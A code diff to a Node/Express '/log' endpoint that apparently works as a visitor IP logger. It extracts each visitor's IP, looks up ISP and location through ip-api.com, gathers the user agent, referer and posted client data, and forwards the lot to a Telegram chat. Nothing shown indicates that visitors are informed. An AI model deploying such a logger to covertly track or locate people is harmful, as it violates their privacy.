@@ -30,25 +30,36 @@ app.get('/', (req, res) => {
 });
 
 app.post('/log', async (req, res) => {
-    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+    // ✅ Clean and safe IP extraction
+    let ip = (
+        req.headers['x-forwarded-for'] ||
+        req.connection?.remoteAddress ||
+        req.socket?.remoteAddress ||
+        req.connection?.socket?.remoteAddress ||
+        ''
+    ).split(',')[0].trim();
+
     const ua = req.headers['user-agent'];
     const ref = req.headers['referer'] || 'Direct';
     const clientData = req.body || {};
 
+    // ✅ GeoIP Lookup
     let ispInfo = 'Unknown ISP';
     let city = 'Unknown City';
     let country = 'Unknown Country';
 
-    try {
-        const geo = await axios.get(`http://ip-api.com/json/${ip}`);
-        ispInfo = geo.data.isp || 'Unknown';
-        city = geo.data.city || 'Unknown';
-        country = geo.data.country || 'Unknown';
-    } catch (err) {
-        console.error('Geo lookup failed:', err.message);
+    if (ip) {
+        try {
+            const geo = await axios.get(`http://ip-api.com/json/${ip}`);
+            ispInfo = geo.data.isp || 'Unknown';
+            city = geo.data.city || 'Unknown';
+            country = geo.data.country || 'Unknown';
+        } catch (err) {
+            console.error('Geo lookup failed:', err.message);
+        }
     }
 
-    const shortUA = ua.length > 120 ? ua.slice(0, 120) + '...' : ua;
+    const shortUA = ua?.length > 120 ? ua.slice(0, 120) + '...' : ua;
 
     const log = `
 \x1b[36m═════════════════════════════════════════════════════════════\x1b[0m
@@ -68,8 +79,10 @@ app.post('/log', async (req, res) => {
 \x1b[36m═════════════════════════════════════════════════════════════\x1b[0m
 `;
 
+    // ✅ Show in Render logs
     console.log(log);
 
+    // ✅ Send to Telegram
     await sendToTelegram(`*New Visitor Logged:*
 *IP:* ${ip}
 *ISP:* ${ispInfo}
